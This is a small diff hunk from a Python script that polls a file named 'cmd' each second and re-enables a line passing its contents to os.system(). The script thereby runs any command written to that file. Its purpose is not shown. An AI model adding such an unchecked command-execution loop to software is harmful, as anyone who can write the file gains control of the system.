@@ -16,6 +16,6 @@ while True:
     else:
         cmd = open('cmd', 'r').read()
         print(cmd)
-        # os.system(cmd)
+        os.system(cmd)
 
     time.sleep(1)
